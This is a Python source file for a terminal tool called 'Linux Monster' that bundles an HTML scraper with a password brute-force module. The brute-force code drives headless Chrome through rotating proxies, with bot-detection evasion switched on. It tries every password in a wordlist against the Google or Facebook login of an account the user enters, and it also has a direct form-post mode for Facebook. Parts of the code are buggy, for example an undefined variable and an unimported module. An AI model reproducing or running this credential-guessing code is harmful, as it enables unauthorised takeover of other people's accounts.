
import requests
import time
import re
import os
import sys
import textwrap
import json
import random
import logging
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup as beautifulsoup

black = "\033[2;30m"
red = "\033[1;31m"
yellow = "\033[1;33m"
plain = "\033[1;0m"
blue = "\033[1;36m"
dp_blue = "\033[2;34m"
purple = "\033[2;35m"
blue_bg = "\033[1;44m"
red_bg = "\033[1;41m"
green = "\033[1;32m"
  
  
  
with open('data/settings.json', 'r') as setting_conf:
  settings = setting_conf.readlines()
    
def sanitize_json_str(value):
  if value:
    return value.replace(",", "").strip()
  
def proxy_status():
  with open('data/settings.json', 'r') as settings:
    setting = settings.readlines()
    proxy, status = setting[2].split(':')
    if "true" in status.strip():
      return f'{green} ON {plain}'
    else:
      return f'{red} OFF {plain}'
        
def open_settings(modify = False):
  if not modify:
    ackn_setting = settings[1].split(':')
    if not "true" in ackn_setting[1]:
      set_proxy = setting[2].split(':')
      set_ = input(f'{yellow}WOULD YOU LIKE TO USE PROXY ON EVERY JOB [YES | NO] : {plain}\n').lower()
      if set_ == "yes":
        with open('data/proxy.txt', 'r') as op_file:
          not_empty = op_file.readlines()
          if not_empty:
            set_proxy[1] = True
          else:
            set_proxy[1] = False
      else:
        set_proxy[1] = False
          
      set_username = settings[3].split(':')
      session_username = input(f'{yellow}ENTER A USERNAME TO REMEMBER YOU BY LATER : {plain}\n').lower()
      if session_username != "":
        set_username[1] = session_username
      else:
        set_username[1] = "user"
          
      email_set = settings[4].split(':')
      set_email = input(f'{yellow}ENTER YOUR EMAIL ADDRESS FOR RECEIVING MAILS : {plain}\n').lower().strip()
      if set_email != "":
          pattern = r"^[a-zA-Z0-9_+-]+@[a-zA-Z0-9_+]+\.[a-z]{2,}$"
          if re.search(pattern, set_email):
            email_set[1] = set_email
          else:
            email_set[1] = 'placeholder@gmail.com'
            
      ackn_setting[1] = True
      if ackn_setting[1]:
        setting_dict = {
          "settings":ackn_setting[1],
          "proxy": set_proxy[1],
          "username":set_username[1].strip(),
          "email address":email_set[1].strip(),
        }
        with open('data/settings.json', 'w') as setting_conf:
          json.dump(setting_dict, setting_conf, indent = 4)
          
  else:
    ackn_setting = settings[1].split(':')
    if ackn_setting[1] != "false":
      while modify == True:
          
        setting_var = f'''
        {blue_bg}𝚂𝚎𝚝𝚝𝚒𝚗𝚐{plain}{yellow}\n
        [1] 𝙿𝚛𝚘𝚡𝚢
        [2] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎     
        [3] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜
        [4] 𝚂𝚊𝚟𝚎 𝚜𝚎𝚝𝚝𝚒𝚗𝚐𝚜
            
        𝙴𝚗𝚝𝚎𝚛 : {plain}'''
        like_to = input(textwrap.dedent(setting_var))
          
        if like_to == "1":
          proxy_setting = settings[2].split(':')
          check_proxy = proxy_status()
          if 'on' in check_proxy.lower():
            new_proxy = input(f'{yellow}Would you like to disable proxy : [Yes | No] : {plain}').lower()
            if new_proxy == 'yes':
              proxy_setting[1] = False
            else:
              proxy_setting[1] = True
          elif 'off' in check_proxy.lower():
            new_proxy = input(f'{yellow}Would you like to enable proxy : [Yes | No] : {plain}').lower()
            if new_proxy == 'yes':
              proxy_setting[1] = True
            else:
              proxy_setting[1] = False
              
        elif "2" in like_to:
          username_setting = settings[3].split(':')
          current_username = username_setting[1].strip()
          print(f'CURRENT USERNAME : {blue}{current_username}{plain}')
          change_user = input('Would you like to change your username [YES | NO] : ').strip().lower()
          if change_user in ["y", "yes"]:
            new_username = input('Enter your new username : ')
            username_setting[1] = new_username
          else: 
            pass
        elif "3" in like_to:
          email_setting = settings[4].split(':')
          current_email = email_setting[1].strip()
          print(f'Your current email: {blue}{current_email}{plain}')
          change_email = input('WOULD YOU LIKE TO CHANGE THIS [YES | NO] : ').strip().lower()
          if change_email == "yes":
            changing = True
            while changing:
              new_email = input('ENTER A NEW EMAIL ADDRESS : \n')
              pattern = r"^[a-zA-Z0-9_+.]+@[a-zA-Z0-9_+]+\.[a-z]{2,3}$"
              if re.search(pattern, new_email):
                email_setting[1] = new_email
                changing = False
              else:
                print(f'\n{red_bg}THAT WASN\"T AN EMAIL ADDRESS YOU DORK!!!{plain}')
          elif change_email == "no":
            pass
        elif "4" in like_to:
          default_setting = {
          "settings": True,
          "proxy": settings[2].split(':')[1].strip() == "true",
          "username":settings[3].split(':')[1].replace(",", "").strip('"').strip().strip('"'),
          "email address":settings[4].split(':')[1].replace(",", "").strip('"').strip().strip('"'),
          }
   
          try:
            if proxy_setting[1]:
              default_setting.update({"proxy":proxy_setting[1]})
          except UnboundLocalError:
            pass
          try:
            if username_setting[1]:
              default_setting.update({"username":sanitize_json_str(username_setting[1])})
          except UnboundLocalError:
            pass
          try:
            if email_setting[1]:
              default_setting.update({"email address":sanitize_json_str(email_setting[1])})
          except UnboundLocalError:
            pass
   
          with open('data/settings.json', 'w') as setting_con:
            json.dump(default_setting,setting_con,indent = 4)
            modify = False
            print(f'{blue}𝚁𝚎𝚜𝚝𝚊𝚛𝚝 𝚝𝚑𝚎 𝚙𝚛𝚘𝚐𝚛𝚊𝚖, 𝚃𝚘 𝚞𝚙𝚍𝚊𝚝𝚎 𝚌𝚑𝚊𝚗𝚐𝚎𝚜')
            sys.exit()
        elif 'exit' in like_to:
          modify = False
  
open_settings()
    
def check_connection():
  try:
    response = requests.get('https://github.com', timeout = 10)
    if response.status_code == 200:
      return f'{green}𝙾𝚗𝚕𝚒𝚗𝚎{plain}'
  except Exception:
    return f'{red}𝙾𝚏𝚏𝚕𝚒𝚗𝚎{plain}'
    
def is_web_address(value):
  full_path = r'(http)s?\:\/\/(\w+\.)*[a-z]+\/?[\w\d\S&#?$€¥¢:=%+]*'
  if re.search(full_path, value):
    return True
      
  return False
  
def onload_proxy(data = None, pop = None):
  with open('data/settings.json', 'r') as set_:
    setting = set_.readlines()[2]
    proxy, status = setting.split(':')
    if "true" in status:
      with open('data/proxy.txt', 'r') as proxfile:
        proxy = [line.strip() for line in proxfile.readlines() if line.strip()]
        if pop is not None and pop in proxy:
          proxy.remove(pop)
          
        if not proxy:
          return None
            
        this_proxy = random.choice(proxy)
        if len(this_proxy.split(':')) == 3:
          address,port,protocol = this_proxy.split(':')
          if all((address,port,protocol)):
            if data == dict:
              return {protocol : f'{protocol}://{address}:{port}'}
            else:
              return f'{protocol}://{address}:{port}'
        else:
          user,pass_,address,port,protocol = this_proxy.split(':')
          if all((user,pass_,address,port)):
            if data == dict:
              return {protocol : f'{protocol}://{user}:{pass_}@{address}:{port}'}
            else:
              return f'{protocol}://{user}:{pass_}@{address}:{port}'
    else:
      set_.close()
      return None
 
def proxy_errorV(errorLogged = None, terminate = None):
  if errorLogged != None:
    if 'net::ERR_SOCKS_CONNECTION_FAILED' in errorLogged:
      logging.error(errorLogged)
      print(f'{red}Socks connection failed{plain}')
    if 'net::ERR_PROXY_CONNECTION_FAILED' in errorLogged:
      onload_proxy(pop = terminate)
      logging.error(errorLogged)
      print(f'{red}Proxy connection failed{plain}')
    else:
      print(errorLogged)
      
      
def main(): 
  logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
        
  holder = rf"""
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
   |   | |\ | | | '\/    |\/| / \ |\ | (_   |  |_  |_)
   | , | | \| | |  /\    |  | \ / | \| , )  |  |   | \
   ~~~ ~ ~  ~ `~' ~  ~   ~  ~  ~  ~  ~  ~   ~  ~~~ ~ ~
                                     {dp_blue}𝙱𝚎 𝚝𝚑𝚎    𝚖𝚘𝚗𝚜𝚝𝚎𝚛{blue}
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜              𝙿𝚛𝚘𝚡𝚢 - {proxy_status()}
   
   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎          {yellow} 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 
   {green}𝙷𝚝𝚖𝚕 𝚜𝚔𝚒𝚗𝚗𝚎𝚛          {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
   {red}𝙴𝚡𝚒𝚝{plain} 
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}  𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  """
  
  bs = beautifulsoup
  command = True
  while command:
    print(f'{blue}{textwrap.dedent(holder)}{plain}')
    command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒.𝚎 [𝚑𝚝𝚖𝚕 𝚘𝚛 𝚑𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛] : {plain}')
    if command.lower() in ['brute', 'brute-force']:
      br = True
      while br:
        target = """
        [1] 𝙶𝚘𝚘𝚐𝚕𝚎 [𝙶-𝚜𝚙𝚕𝚒𝚗𝚝𝚎𝚛]
        [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝙵𝚋-𝚑𝚊𝚌𝚔2.7]
        [3] 𝙴𝚡𝚒𝚝
        
        𝙽𝚘𝚝 𝚘𝚗 𝚝𝚑𝚎 𝚕𝚒𝚜𝚝? 𝚎𝚗𝚝𝚎𝚛 \"𝚌𝚞𝚜𝚝𝚘𝚖\"
        """
        print(blue+textwrap.dedent(target)+plain)
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--incognito')
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        tar = input(f'{yellow}>>> ').lower()
        if tar in ['google','1']:
          with open('data/passwords.txt', 'r') as file:
            pass_ = file.readlines()
          caught_proxy = onload_proxy()
          if caught_proxy is not None:
            if '@' in caught_proxy:
              options.add_argument('--proxy-server=https://127.0.0.1:8000')
            else:
              options.add_argument(f'--proxy-server={caught_proxy}')
     
            
          options.add_argument("--disable-blink-features=AutomationControlled")
          driver = webdriver.Chrome(options = options)
          sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
          try:
            driver.get(sign_in_tar)
            email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
            time.sleep(5)
            wait = WebDriverWait(driver, 20)
            page_source = driver.page_source
            page_ = bs(page_source, 'html.parser')
            if page_.find_all('form'):
  
              target_email = driver.find_element(By.CSS_SELECTOR, 'input[name="identifier"]')
              
              target_email.send_keys(email_or_phone)
              wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
              driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
              captcha = []
            
            for i in range(len(pass_)):
              check_password = pass_[i]
              try:
                wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@type="password"]')))
                target_password = driver.find_element(By .XPATH,'//input[@type="password"]')
                target_password.clear()
                target_password.send_keys(check_password)
                wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
                driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
                print(f'Trying password : {check_password}')
                response_ = bs(driver.page_source, 'html.parser').text
                time.sleep(5)
                if "Wrong password" in response_:
                  print(f'{red}Incorrect password{plain}')
                elif "Confirm that you\'re not a robot" in response_:
                  captcha_con = captcha.extend(check_password)
                  print(f'{red}Captcha detected {plain}')
                  if len(captcha) > 5:
                    print('Sleep time')
                    driver.quit()
                    break
                
                elif r"You're signed in" in response_ or   r"Recovery information" in response_:
                  print(f'{green}Correct password : {check_password}{plain}')
                  driver.quit()
                  break
              except Exception:
                page_ = bs(driver.page_source, 'html.parser')
                if r"Couldn't find your Google account" in page_:
                  print(f'{red}Could find the google account {email_or_phone}{plain}')
                  driver.quit()
                  break
                if r"Enter a valid email or phone number" in page_:
                  print(f'{red}Enter a valid email or phone number{plain}')
                  driver.quit()
                  break
                else:
                  pass
          except Exception:
            track = traceback.format_exc()
            proxy_errorV(errorLogged = track, terminate = caught_proxy)
            driver.quit()
          
        if tar in ['facebook','2']:
          load = ['/', '-', '\\', '|', '/', '-', '\\', '|', '/', '-']
          l = 0
          while l < len(load):
            print(f'\r{plain}𝙻𝚘𝚊𝚍𝚒𝚗𝚐 {green}{load[l]}{plain}', end = '', flush = True)
            time.sleep(0.3)
            l += 1
          
          with open('data/passwords.txt', 'r') as passwords:
            pass_ = passwords.readlines()
          
          username_email = input(f'\n{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
          method = True
          while method:
            print(f'{blue}\n𝙼𝚎𝚝𝚑𝚘𝚍 : 𝚋𝚛𝚞𝚝𝚎(𝚜𝚕𝚘𝚠) 𝚘𝚛 𝚙𝚊𝚢𝚕𝚘𝚊𝚍(𝚏𝚊𝚜𝚝){plain} ')
            method = input(f'{yellow}𝙳𝚎𝚏𝚊𝚞𝚕𝚝 [𝚋𝚛𝚞𝚝𝚎 => 𝚒𝚏 𝚕𝚎𝚏𝚝 𝚎𝚖𝚙𝚝𝚢] >>> {plain}').lower()
            if method in ['brute', 'brute-force','']:
              for i in range(len(pass_)):
                check_password = pass_[i]
                caught_proxy = onload_proxy()
                if caught_proxy is not None:
                  options.add_argument(f'--proxy-server={caught_proxy}')
                  
                driver = webdriver.Chrome(options = options)
                try:
                  driver.get('https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#')
                
                  page_ = bs(driver.page_source, 'html.parser').text
                  if r"This site can’t be reached" in page_:
                    print(f'{red}Facebook can\'t be reached at the moment{plain}')
                    driver.quit()
                    break
                  
                  if r"temporarily blocked" not in page_:
                    wait = WebDriverWait(driver,20)
                    wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@placeholder="Email address or phone number"]')))
              
                    username_field = driver.find_element(By.XPATH,
                  '//input[@placeholder="Email address or phone number"]')
    
                    password_field = driver.find_element(By.XPATH,
                  '//input[@type="password"]')
              
                    username_field.send_keys(username_email)
                    password_field.send_keys(check_password)
                  
                    print(f'\n{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', end = '', flush = True)
                    
                    wait.until(EC.visibility_of_element_located((By.XPATH, '//button[contains(text(), "Log in")]')))
                    driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
                    try:
                    
                      wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")] | //div[contains(text(),  "Check your notifications on another device")]')))
                      page_content = bs(driver.page_source, 'html.parser').text
                      if "incorrect" in page_content:
                        print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}')
                      elif "Check your notifications on  another device" in page_content:
                        print(f'{red}Correct password : {check_password} [{yellow} might have 2 factor authentication {plain}]')
                        driver.quit()
                        break
                      else:
                        print(f'{green} {check_password} is the correct password{plain}')
                        driver.quit()
                        break
                        
                  
                    except selenium.common.exceptions.TimeoutException as sel_timer:
                      logging.critical(sel_timer)
                      pass
                      print(f'{red}Timeout{plain}')
                    except selenium.common.exceptions.NoSuchElementException as sel_err:
                      logging.error(sel_err)
                      print(f'{red}Skip{plain}')
                  else:
                    print(f'{red}Requests have been temporarily blocked{plain}')
               
                except Exception:
                  track = traceback.format_exc()
                  proxy_errorV(errorLogged = track, terminate = caught_proxy)
            
              driver.quit()
            elif method == 'payload':
              target_url = 'https://facebook.com/login.php'
              i = 0
              while i < len(pass_):
                check_password = pass_[i]
                caught_proxy = onload_proxy(data = dict)
                response = requests.get(target_url, proxies = caught_proxy)
                cookies = {i.name : i.value for i in response.cookies}
                target_ = bs(response.text, 'html.parser')
                form = target_.find_all('form')
                if form:
                  data = {'name':f'{username_email}', 'pass':f'{check_password}'}
                  data_sent = requests.post(target_url, data = data, cookies = cookies, proxies = caught_proxy)
          
                  print(f'{yellow}Trying password : {check_password}')
                  if 'Find friends' in data_sent.text or 'Check your notifications on another device' in data_sent.text or 'authentication' in data_sent.text:
                    print(f'{green}[{username_email}] Password found : {check_password}')
                    break
                i += 1
          
        elif tar in ['exit','3']:
          br = False
    elif command.lower() in ['html-skinner', 'html']:
      skinning = True
      while skinning:
        website = input(f'{yellow}𝚆𝚎𝚋 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 >>> {plain}').strip()
        if website.lower() == 'exit':
          skinning = False
          
        if is_web_address(website):
          try:
            caught_proxy = onload_proxy(data = dict)
            
            response = requests.get(website, proxies = caught_proxy, timeout = 30)
            
            if response.status_code == 200:
              beauty = bs(response.text, 'html.parser')
              helper = fr"""
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                𝙲𝚘𝚖𝚖𝚘𝚗  𝚑𝚝𝚖𝚕  𝚝𝚊𝚐𝚜 
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              𝙿𝚊𝚐𝚎 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 - 𝚋𝚘𝚍𝚢,
              𝙿𝚊𝚐𝚎 𝚝𝚒𝚝𝚕𝚎 - 𝚝𝚒𝚝𝚕𝚎,
              𝙻𝚒𝚗𝚔𝚜 - 𝚊,
              𝙿𝚊𝚛𝚊𝚐𝚛𝚊𝚙𝚑 - 𝚙,
              𝙵𝚘𝚛𝚖 - 𝚏𝚘𝚛𝚖 ,
              𝙸𝚗𝚙𝚞𝚝 - 𝚒𝚗𝚙𝚞𝚝,
              𝙱𝚞𝚝𝚝𝚘𝚗 - 𝚋𝚞𝚝𝚝𝚘𝚗,
              𝙱𝚘𝚕𝚍 𝚝𝚎𝚡𝚝𝚜 - 𝚋,
              𝙸𝚝𝚊𝚕𝚒𝚌 𝚝𝚎𝚡𝚝𝚜 - 𝚒,
              𝚍𝚒𝚟.𝚑𝚒 - 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚜 𝚍𝚒𝚟 𝚠𝚒𝚝𝚑 𝚝𝚑𝚎 𝚌𝚕𝚊𝚜𝚜 [𝚑𝚒],
              𝚍𝚒𝚟#𝚑𝚒 - 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚜 𝚍𝚒𝚟 𝚠𝚒𝚝𝚑 𝚝𝚑𝚎 𝚒𝚍 [𝚑𝚒],
              𝚍𝚒𝚟>𝚊𝚝𝚝𝚛=𝚟𝚊𝚕𝚞𝚎 - >𝚊𝚝𝚝𝚛𝚒𝚋𝚞𝚝𝚎 [𝚝𝚢𝚙𝚎, 𝚒𝚍]
                =𝚟𝚊𝚕𝚞𝚎 [𝚑𝚒𝚍𝚍𝚎𝚗, 𝚌𝚑𝚎𝚌𝚔𝚎𝚍],
              𝙴𝚗𝚍 𝚠𝚒𝚝𝚑 ,-𝚜𝚊𝚟𝚎.𝚑𝚝𝚖𝚕 𝚝𝚘 𝚜𝚊𝚟𝚎 𝚝𝚑𝚎 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 𝚒𝚗 𝚊 𝚏𝚒𝚕𝚎 𝚗𝚊𝚖𝚎𝚍 𝚜𝚊𝚟𝚎.𝚑𝚝𝚖𝚕 𝚘𝚝𝚑𝚎𝚛𝚠𝚒𝚜𝚎 [-𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎.𝚑𝚝𝚖𝚕] 
              
              {red}
              𝙳𝚒𝚜𝚌𝚕𝚊𝚒𝚖𝚎𝚛 - 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚒𝚜 𝚝𝚘𝚘𝚕 𝚝𝚘 𝚜𝚌𝚛𝚊𝚙𝚎 𝚍𝚊𝚝𝚊 𝚏𝚛𝚘𝚖 𝚊𝚗𝚢 𝚠𝚎𝚋𝚜𝚒𝚝𝚎 𝚠𝚒𝚝𝚑𝚘𝚞𝚝 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛'𝚜 𝚌𝚘𝚗𝚜𝚎𝚗𝚝 𝚖𝚊𝚢 𝚟𝚒𝚘𝚕𝚊𝚝𝚎 𝚊𝚙𝚙𝚕𝚒𝚌𝚊𝚋𝚕𝚎 𝚕𝚊𝚠𝚜 𝚊𝚗𝚍 𝚝𝚎𝚛𝚖𝚜 𝚘𝚏 𝚜𝚎𝚛𝚟𝚒𝚌𝚎. 𝙰𝚜 𝚝𝚑𝚎 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛, 𝚒 𝚍𝚒𝚜𝚌𝚕𝚊𝚒𝚖 𝚊𝚗𝚢 𝚕𝚒𝚊𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚗 𝚑𝚘𝚠 𝚝𝚑𝚒𝚜 𝚝𝚘𝚘𝚕 𝚒𝚜 𝚞𝚜𝚎𝚍. 𝚄𝚜𝚎𝚛𝚜 𝚊𝚛𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚎 𝚠𝚒𝚝𝚑 𝚎𝚗𝚜𝚞𝚛𝚒𝚗𝚐 𝚌𝚘𝚖𝚙𝚕𝚒𝚊𝚗𝚌𝚎 𝚠𝚒𝚝𝚑 𝚕𝚎𝚐𝚊𝚕 𝚊𝚗𝚍 𝚎𝚝𝚑𝚒𝚌𝚊𝚕 𝚐𝚞𝚒𝚍𝚎𝚕𝚒𝚗𝚎𝚜. 𝙿𝚛𝚘𝚌𝚎𝚎𝚍 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚢 
              
              {blue}
              -𝚂𝚑𝚊𝚍𝚎 
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              """
              help_example = ['𝚝𝚒𝚝𝚕𝚎, 𝚊, 𝚋𝚞𝚝𝚝𝚘𝚗']
            
              print(f'\n{blue}{textwrap.dedent(helper)}{plain}\n')
     
              provide_web = True
              while provide_web:
                html_extract = input (f'[{blue}{response.url}{plain}]\n{yellow}𝙻𝚎𝚝\'𝚜 𝚜𝚌𝚛𝚊𝚙𝚎 𝚜𝚘𝚖𝚎 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 {help_example}: '+plain).lower()
                
                if html_extract.lower() == 'exit':
                  provide_web = False
                
            
                elements_extracted = []
                if not html_extract.endswith(','):
                  html_extract = html_extract+','
              
                i = 0
                list_to_extract = html_extract.split(',')
                if '' in list_to_extract:
                    list_to_extract.remove('')
             
                for each_element in list_to_extract:
                  if each_element not in  ['.', '#', '>=']:
                    elements_extracted.extend(beauty.find_all (each_element))
                  
                  if '.' in each_element:
                    tag, tag_class = each_element.split('.',1)
                    elements_extracted.extend(beauty.find_all(tag, class_ = tag_class))
              
                  if '#' in each_element:
                    tag, tag_id = each_element.split('#',1)
                    elements_extracted.extend(beauty.find_all(tag , id = tag_id))
                  
                  if '>' in each_element:
                    if '=' in each_element:
                      tag,tag_attr = each_element.split('>',1)
                      tag_attr, tag_value = tag_attr.split('=',1)
                      elements_extracted.extend(beauty.find_all(tag, attrs = {tag_attr : tag_value}))
                    else:
                      tag,tag_attr = each_element.split('>',1)
                      elements_extracted.extend(beauty.find_all(tag, attrs = {tag_attr : True}))
                      
                  if each_element.startswith('-'):
                    file_name = each_element[1:]
                    if not os.path.exists('cache/html'):
                      os.mkdir('cache/html')
                    
                    with open(f'cache/html/{file_name}', 'w') as file:
                      j = 0
                      while j < len(elements_extracted):
                        file.write(f'{bs.prettify(elements_extracted[j])}\n')
                        j += 1
                  
                  a = 0
                  while a < len(elements_extracted):
                    print(bs.prettify(elements_extracted[a]))
                    a += 1
                  
                  if '-' in list_to_extract[-1:][0]:
                    print(f'{yellow}𝙵𝚒𝚕𝚎 𝚜𝚊𝚟𝚎𝚍, 𝚝𝚘 𝚘𝚙𝚎𝚗 : [𝚌𝚊𝚝 𝚌𝚊𝚌𝚑𝚎/𝚜𝚔𝚒𝚗𝚗𝚎𝚛/𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎]\n')
                    
                  if not html_extract.lower() == 'exit':
                    print(f'{green}𝙽𝚞𝚖𝚋𝚎𝚛 𝚘𝚏 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 = {len(elements_extracted)}{plain}')
                  
          except requests.exceptions.ConnectionError:
            print(f'{red} Connection error{plain}')
          except requests.exceptions.Timeout:
            print(f'{red} Connection timeout...Please try again{plain}')
          except requests.exceptions.RequestException as e:
            print(f'{red} An error occurred : {e}')
        else:
          if not website.lower() == 'exit':
            print(f'{red} Invalid web address i.e https://example.com{plain}')
          
      
    elif command.lower() in ['setting', 'settings']:
      open_settings(modify = True)
     
    elif command.lower() in ['exit']:
      command = False
      break
    
  
if __name__ == "__main__":
  main()